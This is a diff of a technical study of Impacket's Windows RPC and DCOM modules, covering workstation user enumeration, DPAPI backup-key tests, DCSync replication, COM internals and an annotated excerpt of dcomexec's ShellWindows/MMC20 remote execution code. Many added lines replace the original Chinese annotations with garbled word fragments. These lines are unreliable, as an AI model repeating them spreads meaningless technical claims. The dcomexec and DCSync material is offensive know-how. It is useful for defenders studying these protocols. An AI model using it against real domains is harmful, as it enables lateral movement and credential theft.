-#tasklist：显示系统中当前正在运行的进程列表。
-# taskkill：通过进程 ID (PID) 或映像名称终止任务
-# tscon：将用户会话附加到远程桌面会话
-# tsdiscon：断开远程桌面服务会话
-# tslogoff：注销远程桌面服务会话
-# shutdown：关闭、重启或注销本地/远程计算机
-# msg：向远程桌面服务会话 (MSGBOX) 发送消息
+#
+# qwinstasessioninformation
+#tasklistcurrentinlist
+# taskkill ID (PID) orname
+# tsconusersessionsession
+# tsdisconsession
+# tslogoffsession
+# shutdownclosesor/
+# msgsession (MSGBOX)
 ```
 
-### [MS-WKST]wkst.py
+### [MS-WKST] wkst.py — Workstation Service (logged-on user enumeration)
 
 The Workstation Service Remote Protocol remotely queries and configures certain aspects of the SMB redirector on a remote machine. The official description is vague, so let's go straight to the interface methods the module implements.
 
 ```python
 OPNUMS = {
- 0 : (NetrWkstaGetInfo, NetrWkstaGetInfoResponse),返回有关远程计算机配置的详细信息，包括计算机名称和操作系统的主要和次要版本号
- 1 : (NetrWkstaSetInfo, NetrWkstaSetInfoResponse),根据调用中传递的信息结构配置远程计算机
- 2 : (NetrWkstaUserEnum, NetrWkstaUserEnumResponse),返回有关当前在远程计算机上处于活动状态的用户的详细信息
- 5 : (NetrWkstaTransportEnum, NetrWkstaTransportEnumResponse),提供有关远程计算机上的SMB 网络重定向器当前启用的传输协议的详细信息
- 6 : (NetrWkstaTransportAdd, NetrWkstaTransportAddResponse),使SMB网络重定向器能够在远程计算机上使用传输协议
+ 0 : (NetrWkstaGetInfo, NetrWkstaGetInfoResponse),returns information aboutinformationincludingname
+ 1 : (NetrWkstaSetInfo, NetrWkstaSetInfoResponse),
+ 2 : (NetrWkstaUserEnum, NetrWkstaUserEnumResponse),returns information aboutcurrentinonuserinformation
+ 5 : (NetrWkstaTransportEnum, NetrWkstaTransportEnumResponse),
+ 6 : (NetrWkstaTransportAdd, NetrWkstaTransportAddResponse),
 # 7 : (NetrWkstaTransportDel, NetrWkstaTransportDelResponse),
- 8 : (NetrUseAdd, NetrUseAddResponse),在工作站服务器和 SMB 服务器之间建立连接。工作站服务器不应允许远程调用此方法
- 9 : (NetrUseGetInfo, NetrUseGetInfoResponse),从远程工作站检索有关与 SMB 服务器上共享资源的连接的详细信息。服务器不应允许远程调用此方法
-10 : (NetrUseDel, NetrUseDelResponse),终止从工作站服务器到 SMB 服务器上共享资源的连接。服务器不应该允许远程调用此方法
-11 : (NetrUseEnum, NetrUseEnumResponse),列出工作站服务器和远程 SMB 服务器之间的打开连接。服务器不应允许远程调用此方法
-13 : (NetrWorkstationStatisticsGet, NetrWorkstationStatisticsGetResponse),返回有关远程计算机上SMB 网络重定向器的各种统计信息
-20 : (NetrGetJoinInformation, NetrGetJoinInformationResponse),检索有关指定计算机加入的工作组或域的详细信息
-22 : (NetrJoinDomain2, NetrJoinDomain2Response),使用加密凭据将计算机加入域或工作组
-23 : (NetrUnjoinDomain2, NetrUnjoinDomain2Response),使用加密凭据使计算机脱离工作组或域
-24 : (NetrRenameMachineInDomain2, NetrRenameMachineInDomain2Response),使用加密凭据来更改本地持久变量ComputerNameNetBIOS并可选择重命名当前在域中的服务器的计算机账户，而无需先从域中删除计算机然后再将其添加回来
-25 : (NetrValidateName2, NetrValidateName2Response),验证计算机、工作组或域名的有效性
-26 : (NetrGetJoinableOUs2, NetrGetJoinableOUs2Response),返回一个组织单元 (OU)列表，用户可以在其中创建对象
-27 : (NetrAddAlternateComputerName, NetrAddAlternateComputerNameResponse),为指定服务器添加备用名称
-28 : (NetrRemoveAlternateComputerName, NetrRemoveAlternateComputerNameResponse),删除指定服务器的备用名称
-29 : (NetrSetPrimaryComputerName, NetrSetPrimaryComputerNameResponse),设置指定服务器的主计算机名称
- 30 : (NetrEnumerateComputerNames, NetrEnumerateComputerNamesResponse), 返回指定服务器的计算机名称列表，查询结果由名称类型决定
+ 8 : (NetrUseAdd, NetrUseAddResponse),inserver SMB serverservernotthismethod
+ 9 : (NetrUseGetInfo, NetrUseGetInfoResponse),
+10 : (NetrUseDel, NetrUseDelResponse),
+11 : (NetrUseEnum, NetrUseEnumResponse),
+13 : (NetrWorkstationStatisticsGet, NetrWorkstationStatisticsGetResponse),returns information aboutonSMB information
+20 : (NetrGetJoinInformation, NetrGetJoinInformationResponse),retrievesspecified entrygroupordomaininformation
+22 : (NetrJoinDomain2, NetrJoinDomain2Response),
+23 : (NetrUnjoinDomain2, NetrUnjoinDomain2Response),
+24 : (NetrRenameMachineInDomain2, NetrRenameMachineInDomain2Response),
+25 : (NetrValidateName2, NetrValidateName2Response),
+26 : (NetrGetJoinableOUs2, NetrGetJoinableOUs2Response),returns agroup (OU)listusercaninobject
+27 : (NetrAddAlternateComputerName, NetrAddAlternateComputerNameResponse),asspecifiedserveraddsname
+28 : (NetrRemoveAlternateComputerName, NetrRemoveAlternateComputerNameResponse),deletes the specifiedservername
+29 : (NetrSetPrimaryComputerName, NetrSetPrimaryComputerNameResponse),setsspecifiedservername
+ 30 : (NetrEnumerateComputerNames, NetrEnumerateComputerNamesResponse), returns the specifiedservernamelistqueriesname
 }
 ```
 
@@ -3549,7 +3164,7 @@ RPC clients:
 - taskschd.dll
 - wmicmiplugin.dll
 
-### [MS-BKRP]bkrp.py
+### [MS-BKRP] bkrp.py — Backup Key Protocol (DPAPI domain backup)
 
 The Backup Key Remote Protocol: a client encrypts and decrypts sensitive data (e.g. encryption keys) with the server's help. Data encrypted under this protocol can only be decrypted by the server, so clients may safely store such ciphertext in storage with no special protection. On Windows it provides user-key protection through the [Data Protection API (DPAPI)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/32d60aa4-e40c-414a-986c-db731aca7e71#gt_3af2be04-f627-4a02-a3b0-b465ccede53f) in an [Active Directory domain](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/32d60aa4-e40c-414a-986c-db731aca7e71#gt_fcaec097-23d5-4b8f-b3e7-5739cc9c1d78).
 
@@ -3599,12 +3214,11 @@ class BKRPTests(DCERPCTests):
     authn = True
     authn_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
-    data_in = b"Huh? wait wait, let me, let me explain something to you. Uh, I am not Mr. Lebowski; " \
-              b"you're Mr. Lebowski. I'm the Dude. So that's what you call me. You know, uh, That, or uh, " \
-              b"his Dudeness, or uh Duder, or uh El Duderino, if, you know, you're not into the whole brevity thing--uh."
+    data_in = b"..."   # plaintext test data (a long movie quote in the original, omitted)
 
     def test_BackuprKey_BACKUPKEY_BACKUP_GUID_BACKUPKEY_RESTORE_GUID(self):
         dce, rpctransport = self.connect()
+        # (1) BACKUPKEY_BACKUP_GUID: ask the server to wrap the secret
         request = bkrp.BackuprKey()
         request['pguidActionAgent'] = bkrp.BACKUPKEY_BACKUP_GUID
         request['pDataIn'] = self.data_in
@@ -3613,12 +3227,11 @@ class BKRPTests(DCERPCTests):
 
         resp = dce.request(request)
 
-        resp.dump()
-
+        # (2) parse the server-wrapped WRAPPED_SECRET
         wrapped = bkrp.WRAPPED_SECRET()
         wrapped.fromString(b''.join(resp['ppDataOut']))
-        wrapped.dump()
 
+        # (3) BACKUPKEY_RESTORE_GUID: send the wrapped blob back; the server unwraps it
         request = bkrp.BackuprKey()
         request['pguidActionAgent'] = bkrp.BACKUPKEY_RESTORE_GUID
         request['pDataIn'] = b''.join(resp['ppDataOut'])
@@ -3626,12 +3239,12 @@ class BKRPTests(DCERPCTests):
         request['dwParam'] = 0
 
         resp = dce.request(request)
-        resp.dump()
 
+        # (4) the unwrapped result must equal the original plaintext
         self.assertEqual(self.data_in, b''.join(resp['ppDataOut']))
 ```
 
-### [MS-DHCPM]dhcpm.py
+### [MS-DHCPM] dhcpm.py — DHCP Management Protocol
 
 The OPNUMS table shows that the dhcpm module wraps DHCP information retrieval functions such as DhcpGetClientInfoV4:
 
@@ -3676,18 +3289,18 @@ class DHCPMTests(DCERPCTests):
             dce.request(request)
 ```
 
-### [MS-DRSR]drsuapi.py
+### [MS-DRSR] drsuapi.py — Directory Replication Service (DCSync)
 
 The Directory Replication Service (DRS) Remote Protocol is an [RPC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_8a7f6700-8311-45bc-af10-82e10accd331) protocol for [replicating](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_a5678f3c-cf60-4b89-b835-16d643d1debb) and managing data in [Active Directory](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_e467d927-17bf-49c9-98d1-96ddf61ddd90). It comprises two RPC interfaces named drsuapi and dsaop; every drsuapi method name starts with "IDL_DRS" and every dsaop method with "IDL_DSA".
 
 The module implements the following methods:
 
 ```
- 0 : (DRSBind,DRSBindResponse ),创建一个上下文句柄，它是调用此接口中任何其他方法所必需的
- 1 : (DRSUnbind,DRSUnbindResponse ),方法销毁先前由IDL_DRSBind方法创建的上下文句柄。
- 3 : (DRSGetNCChanges,DRSGetNCChangesResponse ),从服务器上的NC 副本复制更新。
- 12: (DRSCrackNames,DRSCrackNamesResponse ),在目录中查找一组对象 中的每一个，并以请求的格式将其返回给调用者
- 16: (DRSDomainControllerInfo,DRSDomainControllerInfoResponse ),检索有关给定域中DC的信息
+ 0 : (DRSBind,DRSBindResponse ),creates aonhandlethismethod
+ 1 : (DRSUnbind,DRSUnbindResponse ),methodIDL_DRSBindmethodonhandle
+ 3 : (DRSGetNCChanges,DRSGetNCChangesResponse ),
+ 12: (DRSCrackNames,DRSCrackNamesResponse ),ingroupobject returns
+ 16: (DRSDomainControllerInfo,DRSDomainControllerInfoResponse ),retrievesdomainDCinformation
 ```
 
 AD is a database. By default each domain controller (DC) stores a copy of it as the file ntds.dit under %SystemRoot%\NTDS. The **AD database** is logically partitioned into three directory partitions, a.k.a. naming contexts (NCs): the Schema NC, the Configuration NC and the Domain NC. Every DC in the forest holds identical Schema and Configuration NCs (forest-wide data), while every DC in a domain holds an identical copy of that domain's Domain NC. A DC designated as a Global Catalog (GC) server additionally holds partial replicas of other domains' Domain NCs — every object from each domain, but only a subset of attributes.
@@ -3698,7 +3311,7 @@ The first replica of an application directory partition is created on the DC it 
 
 NC replica: a variable containing a tree of objects whose root is identified by a naming context (NC).
 
-### [MS-DSSP]dssp.py
+### [MS-DSSP] dssp.py — Directory Service Setup (DsRoleGetPrimaryDomainInformation)
 
 The Directory Service Setup Remote Protocol exposes one RPC interface by which clients obtain domain-related machine status and configuration information.
 
@@ -3706,12 +3319,12 @@ The module implements only hDsRolerGetPrimaryDomainInformation, querying the MS-
 
 ```c++
  typedef struct _DSROLER_PRIMARY_DOMAIN_INFO_BASIC {
-   DSROLE_MACHINE_ROLE MachineRole;计算机的当前角色，表示为DSROLE_MACHINE_ROLE 数据类型。
-   unsigned __int32 Flags;该值指示目录服务的状态和DomainGuid成员 中包含的信息的有效性。此参数的值必须为零或下表中一个或多个单独标志的组合。该组合是应用到为其检索信息的计算机的标志的按位或的结果。所有未定义的位必须为 0。
-   [unique, string] wchar_t* DomainNameFlat;计算机所属域或非域工作组的 NetBIOS 名称。如果 MachineRole 成员是 DsRole_RoleStandaloneWorkstation 或 DsRole_RoleStandaloneServer，则此成员必须为 NULL，否则不得为 NULL
-   [unique, string] wchar_t* DomainNameDns; 计算机的域名。如果MachineRole成员是DsRole_RoleStandaloneWorkstation 或DsRole_RoleStandaloneServer，则此成员必须为 NULL，否则不得为 NULL
-   [unique, string] wchar_t* DomainForestName;计算机所属的林 的名称。如果计算机是独立的工作站或服务器，则此成员必须为 NULL。
-   GUID DomainGuid;计算机所属域 的UUID 。仅当设置了 DSROLE_PRIMARY_DOMAIN_GUID_PRESENT 标志时，此成员的值才有效。
+ DSROLE_MACHINE_ROLE MachineRole;currentasDSROLE_MACHINE_ROLE
+ unsigned __int32 Flags;theDomainGuid containinginformationthismustasororgroupthegroupasretrievesinformationorallmustas 0
+ [unique, string] wchar_t* DomainNameFlat;domainordomaingroup NetBIOS nameif MachineRole DsRole_RoleStandaloneWorkstation or DsRole_RoleStandaloneServerthenthismustas NULLthennotas NULL
+ [unique, string] wchar_t* DomainNameDns; realmifMachineRoleDsRole_RoleStandaloneWorkstation orDsRole_RoleStandaloneServerthenthismustas NULLthennotas NULL
+ [unique, string] wchar_t* DomainForestName; nameiforserverthenthismustas NULL
+ GUID DomainGuid;domain UUID sets DSROLE_PRIMARY_DOMAIN_GUID_PRESENT this
  } DSROLER_PRIMARY_DOMAIN_INFO_BASIC,
   *PDSROLER_PRIMARY_DOMAIN_INFO_BASIC;
 ```
@@ -3786,68 +3399,68 @@ https://blog.51cto.com/u_15075510/3505281
 In short: COM is a specification, not an implementation. Implemented in C++, a COM component is a C++ class implementing the corresponding COM interfaces, while a COM interface is a pure virtual (abstract) class deriving from IUnknown. The COM specification requires every component or interface to derive from IUnknown. IUnknown defines three important functions: QueryInterface, AddRef and Release — QueryInterface queries interfaces on the component object, AddRef increments and Release decrements the reference count. Reference counting is a cornerstone of COM, elegantly solving the object-lifecycle question (when a component is destroyed and by whom). The specification also requires every component to have a corresponding class factory — itself a COM component implementing IClassFactory; only inside IClassFactory::CreateInstance may `new` instantiate the component class.
 
 ```
-实现一个COM组件，需要完成以下工作：
+COMgroup
 
-+ COM组件接口
-COM组件接口是一个继承IUnknown的抽象类
++ COMgroup
+COMgroupIUnknown
 
-+ COM组件实现类
-就是具体的功能实现类，一个 COM 组件实现类可以同时实现多个 COM 接口
++ COMgroup
+ COM groupcan COM
 
-+ COM组件创建工厂
-通过类工厂来创建com组件实现类的实例
++ COMgroup
+comgroup
 
-+ COM组件注册
-COM组件需要使用regsvr32工具注册到注册表
-DllGetClassObject：用于获得类工厂指针 
-DllCanUnloadNow：系统空闲时会调用这个函数，以确定是否可以卸载COM组件
-DllRegisterServer：将COM组件注册到注册表中 
-DllUnregisterServer：删除注册表中的COM组件的注册信息 
-DLL还有一个可选的入口函数DllMain，可用于初始化和释放全局变量 
-DllMain：DLL的入口函数，在LoadLibrary和FreeLibrary时都会调用
++ COMgroup
+COMgroupregsvr32registry
+DllGetClassObjectused for
+DllCanUnloadNowcanCOMgroup
+DllRegisterServerCOMgroupregistry
+DllUnregisterServerdeletesregistryCOMgroupinformation
+DLL entryDllMainused forreleases
+DllMainDLL entryinLoadLibraryFreeLibrary
 regsvr32 ComTest_Server.dll
-COM 组件的使用流程：初始化 COM 库；CoCreateInstance 通过 CLSID 获取 COM 组件对象实例（返回默认的 IID_IUnknown 接口）；调用 QueryInterface 通过接口 IID 获取接口指针；最后调用接口方法。QueryInterface 负责查找接口，并通过第二个 OUT 参数返回实现该接口的对象指针。
+COM group COM CoCreateInstance CLSID obtains COM groupobjectreturns IID_IUnknown QueryInterface IID obtainsmethodQueryInterface OUT returnstheobject
 ```
 
 ```c++
-CoInitialize(NULL);    // COM 库初始化
+CoInitialize(NULL); // COM
 // ...
 IUnknown *pUnk = NULL;
 IObject *pObj = NULL;
-// 创建组件对象，CLSID_XXX 为 COM 组件类的 GUID（class id），返回默认 IID_IUnknown 接口
+// groupobjectCLSID_XXX as COM group GUIDclass idreturns IID_IUnknown
 HRESULT hr = CoCreateInstance(CLSID_XXX, NULL, CLSCTX_INPROC_SERVER, NULL, IID_IUnknown, (void **)&pUnk);
 if (S_OK == hr)
 {
-    // 获取接口，IID_XXX 为组件接口的 GUID（interface id）
+ // obtainsIID_XXX asgroup GUIDinterface id
     hr = pUnk->QueryInterface(IID_XXX, (void **)&pObj);
     if (S_OK == hr)
     {
-        // 调用接口方法
+ // method
         pObj->DoXXX();
     }
-    // 释放组件对象
+ // releasesgroupobject
     pUnk->Release();
 }
 // ...
-// 释放 COM 库
+// releases COM
 CoUninitialize();
 ```
 
 ```
-DCOM实现
-创建接口和对象
-使用 MIDL 脚本定义自定义接口。
-使用 MIDL 编译器生成 C++ 头文件和编组代码。
-在实现 COM 对象时，选择嵌套或继承技术。
-实现（编码）接口。
-按照身份规则编写IUnknown::QueryInterface方法。
-按照生命周期规则编写IUnknown::AddRef和IUnknown::Release方法。
-实现自己的接口方法。
-创建类工厂
-决定是否要公开自定义或标准工厂接口。
-对于标准工厂接口，实现CreateInstance和LockServer方法。
-如果需要支持动态调用，实现IDispatch接口。
-如果您希望支持任何其他自定义或标准接口，请实现它们。
+DCOM
+object
+ MIDL
+ MIDL C++ group
+in COM objector
+
+thenIUnknown::QueryInterfacemethod
+thenIUnknown::AddRefIUnknown::Releasemethod
+method
+
+or
+CreateInstanceLockServermethod
+ifIDispatch
+ifor
 ```
 
 + context: properties of an execution environment, or an association representing resources with a set of messages exchanged between client and server
@@ -3872,7 +3485,7 @@ DCOM实现
 + object class: in the DCOM protocol, a class of objects identified by a CLSID whose members are obtained via activation. An object class is usually associated with a set of common interfaces implemented by all its objects
 
 ```
-在COM编程中，一个接口包含若干相关方法，一个对象实现若干接口，类工厂是创建或实例化其他COM对象的特殊COM对象。
+inCOMcontainingmethodobjectorCOMobjectCOMobject
 ```
 
 + object exporter ID (OXID): a 64-bit number uniquely identifying an object exporter within an object server
@@ -3930,7 +3543,7 @@ On the Internet or intranet, ORPC still uses standard RPC packets, with DCOM-spe
 + OBJREF: the marshaled form of an object reference.
 
 ```
-以上关于对象引用和对象编组的描述来自微软官方文档的直译。通俗地讲：一个接口指针本质上是本机内存中的一个地址，想把它传给客户端调用，就需要附上 flag（标识对象引用类型）、IID（唯一标识接口）、对象引用（接口指针）等信息，打包成 OBJREF 块进行传输。服务端把它发给客户端，客户端解包后获得可用的接口指针，即可进行远程对象调用。标准编组的 OBJREF 中包含在网络中唯一定位接口指针所需的全部信息（例如 OXID、OXID 解析器地址等）。客户端接收到 OBJREF 后，COM 会将其解组为指向本地代理的接口指针；客户端在接口指针上的任何方法调用，都会经本地代理转发到关联的远程存根（stub），再由存根交给服务器端的目标对象。
+onobjectobjectgrouponclienton flagobjectIIDobjectinformation OBJREF clientclientobjectgroup OBJREF containingininformation OXIDOXID client OBJREF COM groupasclientinonmethodstubserverobject
 ```
 
 ![The structure of OBJREF](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781449307011/files/httpatomoreillycomsourceoreillyimages811233.png)
@@ -3939,7 +3552,7 @@ On the Internet or intranet, ORPC still uses standard RPC packets, with DCOM-spe
   + It stores the RPC string bindings needed to connect to remote objects and hands them to local clients.
   + It sends ping messages to remote objects for which the local machine still holds client references, and receives pings for objects running on the local machine. This duty of the OXID resolver underpins COM garbage collection.
 
-### 6.2 dcomrt.py
+### 6.2 dcomrt.py — DCOM Runtime (DCOMConnection / INTERFACE / IActivation)
 
 With the groundwork laid, on to the dcomrt module: the file opens with the CLSID constants of common DCOM classes and the error-handling functions, followed by the data structures and flag values used in DCOM communication (the ORPC protocol).
 
@@ -4151,33 +3764,33 @@ The function's implementation and parameters:
     def RemoteActivation(self, clsId, iid):
         # Only supports one interface at a time
         self.__portmap.bind(IID_IActivation)
-        ORPCthis = ORPCTHIS()  # ORPCthis，扩展必须为 null
+ ORPCthis = ORPCTHIS() # ORPCthismustas null
         ORPCthis['cid'] = generate()
         ORPCthis['extensions'] = NULL
         ORPCthis['flags'] = 1
 
         request = RemoteActivation()
-        request['Clsid'] = clsId  # 指定要创建对象的 CLSID
-        request['pwszObjectName'] = NULL  # 用于初始化对象的字符串
-        request['pObjectStorage'] = NULL  # 用于初始化对象的 objref
-        request['ClientImpLevel'] = 2  # 该值在接收时被忽略
-        request['Mode'] = 0  # 激活类工厂时为 0xFFFFFFFF，否则为 0
-        request['Interfaces'] = 1  # pIID 元素数量
+ request['Clsid'] = clsId # specifiedobject CLSID
+ request['pwszObjectName'] = NULL # used forobject
+ request['pObjectStorage'] = NULL # used forobject objref
+ request['ClientImpLevel'] = 2 # theinis
+ request['Mode'] = 0 # as 0xFFFFFFFFthenas 0
+ request['Interfaces'] = 1 # pIID
 
         _iid = IID()
         _iid['Data'] = iid
 
-        request['pIIDs'].append(_iid)  # 要创建对象上请求的接口 id 数组
-        request['cRequestedProtseqs'] = 1  # aRequestedProtseqs 中元素的数量，必须在 1 和 MAX_REQUESTED_PROTSEQS 之间
-        request['aRequestedProtseqs'].append(7)  # 客户端支持的 RPC 协议序列标识符
+ request['pIIDs'].append(_iid) # objecton id group
+ request['cRequestedProtseqs'] = 1 # aRequestedProtseqs mustin 1 MAX_REQUESTED_PROTSEQS
+ request['aRequestedProtseqs'].append(7) # client RPC
 
         resp = self.__portmap.request(request)
 
         # Now let's parse the answer and build an Interface instance
 
-        ipidRemUnknown = resp['pipidRemUnknown']  # 对象导出器 IRemUnknown 的 IPID
+ ipidRemUnknown = resp['pipidRemUnknown'] # object output IRemUnknown IPID
 
-        Oxids = b''.join(pack('<H', x) for x in resp['ppdsaOxidBindings']['aStringArray'])  # object exporter 的 OXID 绑定数据
+ Oxids = b''.join(pack('<H', x) for x in resp['ppdsaOxidBindings']['aStringArray']) # object exporter OXID
         strBindings = Oxids[:resp['ppdsaOxidBindings']['wSecurityOffset']*2]
         securityBindings = Oxids[resp['ppdsaOxidBindings']['wSecurityOffset']*2:]
 
@@ -4187,7 +3800,7 @@ The function's implementation and parameters:
             if strBindings[0:1] == b'\x00' and strBindings[1:2] == b'\x00':
                 done = True
             else:
-                binding = STRINGBINDING(strBindings)  # 对象导出器支持的字符串与安全绑定（不能为 NULL，应包含端点）
+ binding = STRINGBINDING(strBindings) # object outputwithnotas NULLcontaining
                 stringBindings.append(binding)
                 strBindings = strBindings[len(binding):]
 
@@ -4324,41 +3937,41 @@ Common interface ids follow:
 The methods implemented by the IDispatch class in the module:
 
 ```c++
-GetTypeInfoCount  确定自动化服务器是否提供类型描述信息
-GetTypeInfo      提供对自动化服务器公开的类型描述信息的访问
-GetIDsOfNames    将单个成员名称（方法或属性名称）和一组可选的参数名称映射到一组相应的整数DISPIDs，可用于对IDispatch::Invoke的后续调用。
-Invoke           提供对自动化服务器公开的属性和方法的访问
+GetTypeInfoCount serverinformation
+GetTypeInfo serverinformation
+GetIDsOfNames namemethodornamegroupnamegroupDISPIDsused forIDispatch::Invoke
+Invoke servermethod
 
 
  HRESULT GetIDsOfNames(
    [in] REFIID riid,
-   必须等于 IID_NULL
+ must IID_NULL
    [in, size_is(cNames)] LPOLESTR* rgszNames
-   必须是要映射的字符串数组。数组中的第一个字符串必须指定服务器支持的方法或属性的名称。任何附加字符串必须包含第一个字符串中的值指定的方法或属性的所有参数的名称。映射必须不区分大小写。
+ mustgroupgroupmustspecifiedservermethodornamemustcontainingspecifiedmethodorallnamemustnot
    [in, range(0,16384)] UINT cNames,
-   必须等于要映射的名称的数量，并且必须介于 0 和 16384 之间
+ mustnamemust 0 16384
    [in] LCID lcid,
-   必须等于解释名称的区域设置 ID。
+ mustnamedomainsets ID
    [out, size_is(cNames)] DISPID* rgDispId
-   必须是由服务器填写的 DISPID 数组。每个 DISPID 按位置对应于rgszNames中传递的名称之一。
-   如果严重性位设置为 0，则该方法成功完成。
-   如果严重性位设置为 1 并且整个 HRESULT DWORD 与下表中的值不匹配，则发生致命故障。
-   如果严重性位设置为 1 并且整个 HRESULT DWORD 与下表中的值匹配，则发生故障。
+ mustserver DISPID group DISPID rgszNamesname
+ ifsetsas 0thenthemethod
+ ifsetsas 1 HRESULT DWORD withnotthen
+ ifsetsas 1 HRESULT DWORD withthen
  );
  
   HRESULT Invoke(
-   [in] DISPID dispIdMember,必须等于要调用的方法或属性的DISPID 
-   [in] REFIID riid,必须等于 IID_NULL
-   [in] LCID lcid,必须等于自动化服务器支持的区域设置 ID
-   [in] DWORD dwFlags,必须是下表中指定的位标志的组合
+ [in] DISPID dispIdMember,mustmethodorDISPID
+ [in] REFIID riid,must IID_NULL
+ [in] LCID lcid,mustserverdomainsets ID
+ [in] DWORD dwFlags,mustspecifiedgroup
    [in] DISPPARAMS* pDispParams,
- 指针必须指向 定义传递给方法的参数的DISPPARAMS结构。参数必须以pDispParams->rgvarg相反的顺序存储，以便第一个参数是数组中索引最高的那个。Byref 参数必须在此数组中标记为 VT_EMPTY 条目，并改为存储在rgVarRef中 。
-   [out] VARIANT* pVarResult,指向将填充方法或属性调用结果的 VARIANT指针
-   [out] EXCEPINFO* pExcepInfo,如果该值不为空且返回值为 DISP_E_EXCEPTION，则该结构必须由自动化服务器填充。否则，它必须为scode 和wCode字段指定一个 0 值，并且必须在接收时忽略它。
-    [out] UINT* pArgErr,如果此值不为空且返回值为 DISP_E_TYPEMISMATCH 或 DISP_E_PARAMNOTFOUND，则此参数必须等于 pDispParams->rgvarg 中第一个有错误的参数的索引。否则，接收方必须忽略该参数。
-   [in] UINT cVarRef,必须等于pDispParams中传递的 byref 参数的数量。
-    [in, size_is(cVarRef)] UINT* rgVarRefIdx,必须包含 cVarRef 个无符号整数，每个整数是 pDispParams->rgvarg 中标记为 VT_EMPTY 的 byref 参数的索引。
-       [in, out, size_is(cVarRef)] VARIANT* rgVarRef 必须包含客户端在调用时设置的 byref 参数，以及从调用成功返回时由服务器设置的参数。此数组中的参数也必须以相反的顺序存储，以便第一个 byref 参数在数组中具有最高索引。
+ must methodDISPPARAMSmustpDispParams->rgvarggroupByref mustinthisgroupas VT_EMPTY asinrgVarRef
+ [out] VARIANT* pVarResult,paddingmethodor VARIANT
+ [out] EXCEPINFO* pExcepInfo,ifthenotasreturnsas DISP_E_EXCEPTIONthenthemustserverpaddingthenmustasscode wCodespecified 0 mustin
+ [out] UINT* pArgErr,ifthisnotasreturnsas DISP_E_TYPEMISMATCH or DISP_E_PARAMNOTFOUNDthenthismust pDispParams->rgvarg thenmustthe
+ [in] UINT cVarRef,mustpDispParams byref
+ [in, size_is(cVarRef)] UINT* rgVarRefIdx,mustcontaining cVarRef pDispParams->rgvarg as VT_EMPTY byref
+ [in, out, size_is(cVarRef)] VARIANT* rgVarRef mustcontainingclientinsets byref andreturnsserversetsthisgroupmust byref ingroup
  );
 ```
 
@@ -4409,25 +4022,7 @@ The dcomexec ShellWindows invocation uses Invoke:
 
 ```python
 class DCOMEXEC:
-    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
-                 noOutput=False, doKerberos=False, kdcHost=None, dcomObject=None, shell_type=None):
-        self.__command = command
-        self.__username = username
-        self.__password = password
-        self.__domain = domain
-        self.__lmhash = ''
-        self.__nthash = ''
-        self.__aesKey = aesKey
-        self.__share = share
-        self.__noOutput = noOutput
-        self.__doKerberos = doKerberos
-        self.__kdcHost = kdcHost
-        self.__dcomObject = dcomObject
-        self.__shell_type = shell_type
-        self.shell = None
-        if hashes is not None:
-            self.__lmhash, self.__nthash = hashes.split(':')
-
+    ......
     def getInterface(self, interface, resp):
         # Now let's parse the answer and build an Interface instance
         objRefType = OBJREF(b''.join(resp))['flags']
@@ -4449,41 +4044,23 @@ class DCOMEXEC:
                       target=interface.get_target()))
 
     def run(self, addr, silentCommand=False):
-        if self.__noOutput is False and silentCommand is False:
-            smbConnection = SMBConnection(addr, addr)
-            if self.__doKerberos is False:
-                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-
-            dialect = smbConnection.getDialect()
-            if dialect == SMB_DIALECT:
-                logging.info("SMBv1 dialect used")
-            elif dialect == SMB2_DIALECT_002:
-                logging.info("SMBv2.0 dialect used")
-            elif dialect == SMB2_DIALECT_21:
-                logging.info("SMBv2.1 dialect used")
-            else:
-                logging.info("SMBv3.0 dialect used")
-        else:
-            smbConnection = None
-
+        ......
+        # (1) Establish the DCOM connection (EPM resolution, SCM activation and OXID resolution happen inside)
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
-            dispParams = DISPPARAMS(None, False)
-            dispParams['rgvarg'] = NULL
-            dispParams['rgdispidNamedArgs'] = NULL
-            dispParams['cArgs'] = 0
-            dispParams['cNamedArgs'] = 0
+            dispParams = DISPPARAMS(None, False)   # the generic parameter container for Invoke
+            ......
 
             if self.__dcomObject == 'ShellWindows':
+                # (2) Activate the DCOM component by CLSID; CoCreateInstanceEx returns the default IDispatch interface
                 # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
                 iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
                 iMMC = IDispatch(iInterface)
+                # (3) GetIDsOfNames: method/property name -> DISPID; Invoke: call by DISPID
                 resp = iMMC.GetIDsOfNames(('Item',))
                 resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+                # (4) The property returns a marshaled interface pointer; getInterface unpacks the OBJREF into a new interface
                 iItem = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 resp = iItem.GetIDsOfNames(('Document',))
                 resp = iItem.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
@@ -4496,18 +4073,12 @@ class DCOMEXEC:
                 resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                 pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
             elif self.__dcomObject == 'MMC20':
-                iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
-                iMMC = IDispatch(iInterface)
-                resp = iMMC.GetIDsOfNames(('Document',))
